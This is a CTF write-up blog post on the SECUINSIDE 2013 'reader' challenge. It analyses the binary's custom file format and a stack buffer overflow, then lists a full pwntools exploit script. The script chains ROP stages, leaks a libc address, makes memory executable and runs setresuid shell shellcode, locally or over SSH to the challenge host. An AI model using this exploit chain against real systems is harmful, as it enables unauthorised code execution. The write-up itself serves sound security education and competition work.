---
title: reader - SECUINSIDE 2013
author: IdolfHatler
layout: post
published: true
date: 2013-06-01 18:03:07
---

Challenge description:
><pre>http://war.secuinside.com/files/reader
> <b></b>
> ip : 59.9.131.155
> port : 8282 (SSH)
> account : guest / guest
> <b></b>
> We have obtained a program designed for giving orders to criminals.
> <b></b>
> Our investigators haven't yet analyzed the file format this program reads.
> <b></b>
> Please help us analyze the file format this program uses, find a vulnerability, and take a shell.

We were not able to participate seriously in SECUINSIDE, as it collided with events at our university.

One of the few problems we managed to solve was reader, though we only managed to solve it locally, since we used [pwntools](https://github.com/pwnies/pwntools) and did not have time to/care enough to port it to plain python.

As to avoid running into this problem in another CTF, we have implemented an ssh backend in pwntools using paramiko and improved our rop module. But enoug meta, onto the challenge!

The program itself was fairly simple: Parse a weird format, print it out in a weird format and remember to have overflows everywhere. The format it parsed was:

```c
struct {
    char header1[12];       // Must be "\xffSECUINSIDE\x00"
    char section1[50];      // Must have a null-byte in the first 12 bytes
    char section2[50];
    char header2[4];        // Must be "\xff\xff\xff\xff"
    int len1;               // 5 <= len1 <= 50
    int len2;               // len2 <= 100
    int len3;               // len3 <= 800
    int timeout;            // how much do you want to usleep?
    char fill_char;         // Must not be '\x00'
    char buf1[len1];
    char buf2[len2];
    char buf3[len3];
}
```

This was then read into this structure:

```c
struct {
    int len1;
    int len2;
    int len3;
    int timeout;
    char fill_char;     // Non-packed -- meaning 3 padding bytes afterwards
    char *buf1;         // malloc'ed
    char *buf2;         // malloc'ed
    char *buf3;         // malloc'ed
    char section1[51];  // Always null-terminated
    char section2[51];  // Always null-terminated
}
```


The only overflowable function without a stack cookie was the print function at 0x08048d41. This could be overflowed by because buf2 is set to a stack variable at 0x08048f1e and then memcpy'ed to at 0x08048d1d.

However this only gave us a 14 byte overflow from eip and upwards. This might not seem like much, however it is more than enough for a ret2libc attack, if ASLR is disabled.

As everbody knows, ASLR can be disabled locally by doing <b>ulimit -s unlimited</b>. However assume that your lack of sleep have made you forget this important fact, then what would you do? One solution would be to:

0. Jump slightly back in main to 0x08049157
1. Run the parsing of the file again to a known address (for example .bss + 0x100)
2. Run the same overflow again, thus gaining a slightly larger rop
3. Migrate your rop to the known address
4. Load more rop (for example at .bss + 0x200) and migrate to it
5. Print the address of printf to stdout
6. Generate more rop calculated from the printf address
7. Load it in (for example at .bss + 0x300) and migrate to it
8. Call mprotect and read shellcode (for example to .bss + 0x400)
9. Jump to shellcode and win

All of this can be done using only 99 lines with pwntools:

```python
#!/usr/bin/env python
from pwn import *
import sys
context('i386', 'linux')
splash()

# Magic variables
fd = 3
memcpy = 0x080487f3
stdout = 0x0804b080
do_it_again = 0x08049157

# Configuration
shellcode = shellcode.setresuidsh()
LOCAL = True
HOST = 'guest:guest@59.9.131.155:8282'

# Initialize rop
r = ROP('reader')

# read rop2 to the address .bss+0x200 and migrate to it
r.call('read', (fd, r.sections['.bss'] + 0x200, 0x100))
r.migrate(r.sections['.bss'] + 0x200)
rop1 = r.flush()

# puts the address of printf
r.call('puts', 'MAGIC')
r.call('puts', r.got['printf'])

# fflush stdout. 0x41414141 will be replaced by the memcpy
r.call(memcpy, (r.sections['.bss'] + 0x200 + 4*(3+3+5+2), stdout, 4))
r.call('fflush', 0x41414141)

# read rop3 to the address .bss+0x300 and migrate to it
r.call('read', (0, r.sections['.bss'] + 0x300, 0x100))
r.migrate(r.sections['.bss'] + 0x300)
rop2 = r.flush()

# File 1
section1  = '\x00' + 'A'*49
buf1 = 'A'*8
buf2 = flat('\0'*36, do_it_again, 0x41414141, r.sections['.bss'] + 0x100).ljust(100)
buf3 = 'A'*8
file1 = flat(
    '\xffSECUINSIDE\x00',               # first header
    section1, 'A' * 50,                 # two 50-byte sections
    -1,                                 # second header
    len(buf1), len(buf2), len(buf3),    # the lengths to read
    0, 'A',                             # usleep time, fill character
    buf1, buf2, buf3)

# File 2
section1  = ('\x00' + rop1).ljust(50)
buf1 = 'A'*8
buf2 = flat('\0'*32, r.sections['.bss'] + 0x100 + 0x21 - 4, r._gadgets['leave'][0]).ljust(100)
buf3 = 'A'*8
file2 = flat(
    '\xffSECUINSIDE\x00',               # first header
    section1, 'A' * 50,                 # two 50-byte sections
    -1,                                 # second header
    len(buf1), len(buf2), len(buf3),    # the lengths to read
    0, 'A',                             # usleep time, fill character
    buf1, buf2, buf3)

sploit = file1 + file2 + rop2

# And now for the actual exploitation
if LOCAL:
    write('sploit.sec', sploit)
    sock = process('./reader sploit.sec')
else:
    ssh = ssh(HOST)
    ssh.upload('sploit.sec', raw = sploit)
    ssh.libs('reader', rop = r)
    sock = ssh.run('./reader sploit.sec')

# Wait for rop2 to run
sock.recvuntil('MAGIC\n')

# Read the address of printf and update the rop object
printf = u32(sock.recvn(4))
r.load_library('libc', printf, 'printf')

# We can now use any function in libc (that does not use too much stack)
# However we like shellcode, so only mprotect, read and write is needed
r.call('mprotect', ((r.sections['.bss'] + 0x400)        & ~4095, 4096, 7))
r.call('mprotect', ((r.sections['.bss'] + 0x400 + 4096) & ~4095, 4096, 7))
r.call('write', (1, 'MAGIC\n', 6))
r.call('read', (0, r.sections['.bss'] + 0x400, len(shellcode)))
r.call(r.sections['.bss'] + 0x400)
rop3 = r.flush()
sock.send(rop3)

# Wait for rop3 to run, then send the shellcode
sock.recvuntil('MAGIC\n')
sock.send(shellcode)

# And now a shell
sock.interactive()
```

As seen, this uses both our recently implemented ssh features and the fact that rop now supports arbitrary structures. The rop-call to 'write' is a simple example, however deeply nested structures are supported too.
